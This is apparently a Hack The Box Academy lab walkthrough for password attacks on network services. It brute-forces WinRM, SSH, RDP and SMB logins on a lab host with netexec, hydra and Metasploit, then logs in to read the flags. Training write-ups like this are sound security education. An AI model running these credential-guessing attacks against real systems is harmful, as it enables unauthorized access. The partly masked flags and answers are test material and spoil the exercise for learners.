### CPTS / HTB Penetration Tester Path <br>
### Password Attacks: Network Services <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

IP: 10.129.202.136

---

### Question 1:
Find the user for the WinRM service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

Download and unpack the lists into your home dir:
```diff
+ $ wget https://academy.hackthebox.com/storage/modules/147/network-services.zip
+ $ unzip network-services.zip
```

Now use netexec to run a dict attack against WinRM:
```diff
+ $ netexec winrm 10.129.202.136 -u username.list -p password.list
```

	SNIP
	
	WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\archive:princess
	WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\adc:princess
	WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\accountspayable:princess
	WINRM       10.129.202.136  5985   WINSRV           [-] WINSRV\:princess
	WINRM       10.129.202.136  5985   WINSRV           [+] WINSRV\john:november (Pwn3d!)

Got creds: john:november
Let's throw them into Evil-WinRM to pop a powershell:
```diff
+ $ evil-winrm -i 10.129.202.136 -u john -p november
```

	Evil-WinRM shell v3.5
	
	Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
	
	Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
	
	Info: Establishing connection to remote endpoint
	*Evil-WinRM* PS C:\Users\john\Documents>

Use the Get-ChildItem cmdlet to search recursively for the flag filename:
```diff
+ *Evil-WinRM* PS C:\Users> Get-ChildItem -Path . -Filter "flag.txt" -Recurse
```

	    Directory: C:\Users\john\Desktop
	
	
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	-a----         1/5/2022   8:13 AM             18 flag.txt

Nice!
```diff
+ *Evil-WinRM* PS C:\Users\john\Desktop> type flag.txt
```

	HTB{That5Novemb3r}

🚩 found **HTB{That5No--edit--vemb3r}**.

---

### Question 2:
Find the user for the SSH service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

Let's use hydra to find the right username for ssh:
```diff
+ $ hydra -L username.list -P password.list ssh://10.129.202.136
```

	Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
	
	[22][ssh] host: 10.129.202.136   login: dennis   password: rockstar

Found creds dennis:rockstar. Now lets try to waltz in the backdoor:
```diff
+ $ ssh dennis@10.129.202.136
```

	The authenticity of host '10.129.202.136 (10.129.202.136)' can't be established.
	ED25519 key fingerprint is SHA256:dRz9BL6NhfzNWUhWdhoTCZB0pFXi+moLOqEj4XlPHOY.
	This key is not known by any other names.
	Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
	Warning: Permanently added '10.129.202.136' (ED25519) to the list of known hosts.
	dennis@10.129.202.136's password:
```diff
+ dennis@WINSRV C:\Users\dennis>cd Desktop
+ dennis@WINSRV C:\Users\dennis\Desktop>type flag.txt
```

	HTB{Let5R0ck1t}

🚩 found **HTB{Let5--edit--R0ck1t}**.

---

### Question 3:
Find the user for the RDP service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.
```diff
+ $ hydra -L username.list -P password.list rdp://10.129.202.136
```

	[DATA] max 4 tasks per 1 server, overall 4 tasks, 21112 login tries (l:104/p:203), ~5278 tries per task
	[DATA] attacking rdp://10.129.202.136:3389/
	[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: john password: november, continuing attacking the account.
	[3389][rdp] account on 10.129.202.136 might be valid but account not active for remote desktop: login: dennis password: rockstar, continuing attacking the account.
	[STATUS] 217.00 tries/min, 217 tries in 00:01h, 20897 to do in 01:37h, 2 active
	
	[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\chris:789456123'

Found creds chris:789456123. Toss the fries in the bag:
```diff
+ $ xfreerdp /v:10.129.202.136 /u:chris /p:789456123
```

And we see our flag right on the Desktop:

🚩 found **HTB{R3m0t3Des--edit--kIsw4yT00easy}**.

---

### Question 4:
Find the user for the SMB service and crack their password. Then, when you log in, you will find the flag in a file there. Submit the flag you found as the answer.

Fire up our msf swiss army knife:
```diff
+ $ msfconsole
```

And have a look-see for an smb login module:
```diff
+ [msf](Jobs:0 Agents:0) >> search smb login
```

	Matching Modules
	================
	
	   #   Name                                                Disclosure Date  Rank       Check  Description
	   -   ----                                                ---------------  ----       -----  -----------
	   0   exploit/windows/smb/ms04_007_killbill               2004-02-10       low        No     MS04-007 Microsoft ASN.1 Library Bitstring Heap Overflow
	   1   exploit/windows/smb/smb_relay                       2001-03-31       excellent  Yes    MS08-068 Microsoft Windows SMB Relay Code Execution
	   2     \_ action: CREATE_SMB_SESSION                     .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
	   3     \_ action: PSEXEC                                 .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
	   4     \_ target: Automatic                              .                .          .      .
	   5     \_ target: PowerShell                             .                .          .      .
	   6     \_ target: Native upload                          .                .          .      .
	   7     \_ target: MOF upload                             .                .          .      .
	   8     \_ target: Command                                .                .          .      .
	   9   exploit/windows/smb/ms17_010_eternalblue            2017-03-14       average    Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
	   19  exploit/windows/smb/smb_shadow                      2021-02-16       manual     No     Microsoft Windows SMB Direct Session Takeover
	   20  auxiliary/scanner/smb/smb_login                     .                normal     No     SMB Login Check Scanner
	   21  auxiliary/fuzzers/smb/smb_ntlm1_login_corrupt       .                normal     No     SMB NTLMv1 Login Request Corruption
	   22  exploit/multi/http/pgadmin_session_deserialization  2024-03-04       excellent  Yes    pgAdmin Session Deserialization RCE
```diff
+ [msf](Jobs:0 Agents:0) >> use 20
```

Now use `show options` to see what fields are required and fill them out appropriately:
```diff
+ [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set rhost 10.129.202.136
+ [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set user_file username.list
+ [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> set pass_file password.list
+ [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_login) >> exploit
```

	SNIP
	
	[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\cassie:abc123',
	[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\cassie:nicole',
	[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\cassie:daniel',
	[+] 10.129.202.136:445    - 10.129.202.136:445 - Success: '.\cassie:12345678910'
	[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\admin:123456',
	[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\admin:12345',
	[-] 10.129.202.136:445    - 10.129.202.136:445 - Failed: '.\admin:123456789',
	
	SNIP

Found some valid creds, cassie:12345678910. We can use smbclient to authenticate:
```diff
+ $ smbclient ////10.129.202.136//cassie -U cassie
```

Now just navigate to the Desktop and type the flag:

🚩 found **HTB{S4ndM4--edit--ndB33}**.
